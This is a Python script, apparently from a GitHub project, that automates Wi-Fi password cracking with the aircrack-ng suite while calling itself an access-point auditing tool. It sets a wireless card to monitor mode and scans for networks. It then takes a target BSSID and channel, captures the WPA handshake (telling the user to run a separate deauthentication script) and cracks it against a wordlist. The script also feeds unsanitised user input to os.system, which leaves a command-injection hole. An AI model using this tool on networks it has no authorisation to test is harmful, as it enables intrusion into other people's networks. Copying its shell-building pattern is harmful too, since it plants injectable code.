#! /usr/bin/python3
# -*- coding: utf-8 -*-

'''
 This script automates the security auditing procedure of nearby access points utilizing the aircrack-ng suite (https://www.aircrack-ng.org/)
 yelhamer (github.com/yelhamer)
'''

from os import system
from time import sleep
from termcolor import colored, cprint

logo = colored('''
 █     █░██▓ ███████▓▄████▄  ██▀███  ▄▄▄      ▄████▄  ██ ▄█▓█████ ██▀███  
▓█░ █ ░█▓██▓██   ▓██▒██▀ ▀█ ▓██ ▒ ██▒████▄   ▒██▀ ▀█  ██▄█▒▓█   ▀▓██ ▒ ██▒
▒█░ █ ░█▒██▒████ ▒██▒▓█    ▄▓██ ░▄█ ▒██  ▀█▄ ▒▓█    ▄▓███▄░▒███  ▓██ ░▄█ ▒
░█░ █ ░█░██░▓█▒  ░██▒▓▓▄ ▄██▒██▀▀█▄ ░██▄▄▄▄██▒▓▓▄ ▄██▓██ █▄▒▓█  ▄▒██▀▀█▄  
░░██▒██▓░██░▒█░  ░██▒ ▓███▀ ░██▓ ▒██▒▓█   ▓██▒ ▓███▀ ▒██▒ █░▒████░██▓ ▒██▒
░ ▓░▒ ▒ ░▓  ▒ ░  ░▓ ░ ░▒ ▒  ░ ▒▓ ░▒▓░▒▒   ▓▒█░ ░▒ ▒  ▒ ▒▒ ▓░░ ▒░ ░ ▒▓ ░▒▓░
  ▒ ░ ░  ▒ ░░     ▒ ░ ░  ▒    ░▒ ░ ▒░ ▒   ▒▒ ░ ░  ▒  ░ ░▒ ▒░░ ░  ░ ░▒ ░ ▒░
  ░   ░  ▒ ░░ ░   ▒ ░         ░░   ░  ░   ▒  ░       ░ ░░ ░   ░    ░░   ░ 
    ░    ░        ░ ░ ░        ░          ░  ░ ░     ░  ░     ░  ░  ░     
                    ░                        ░                            
''', 'red')

intro = colored('Access-Point Auditing script', 'red')

print(logo)
print(intro)

# asks for wireless card to apply monitor mode on it
wireless_card = input('Wireless Interface to use: ')

# turns wireless card into monitor mod
mon0 = 'ifconfig {0} down && iwconfig {0} mode monitor && ifconfig {0} up'.format(wireless_card)
system(mon0)

# runs a scan with airodump-ng to get available wifi
airodump = 'airodump-ng {0}'.format(wireless_card)
system(airodump)

# asks for your target's bssid
bssid = input('Target\'s BSSID: ')

# asks for your target's channel
channel = input('Target\'s Operating Channel: ')
save = input('Save Directory ')
cprint('...', 'red'),
cprint('Airodump is starting. In the meanwhile, run deauth.py in a new terminal', 'red')
sleep(4)

# starts airodump-ng on a network to capture handshakes and open new xterm to deauth connected devices
airodump2 = 'airodump-ng -c {0} --bssid {1} -w {2} {3}'.format(channel, bssid, save, wireless_card)
system(airodump2)
cprint('Handshake is captured', 'green')
cprint('Cracking the handshake with aircrack-ng is starting...', 'green')

# 'Aircrack-ng' parameters set
wordlist = input('Wordlist Path: ')
save2 = input('Directory of the Previously Generated Cap File e.g. 01.cap')
cprint('This might take a while', 'red')
crack = 'aircrack-ng -a 2 {0}{1} -w {2} '.format(save, save2, wordlist)
system(crack)
print('Quitting...')
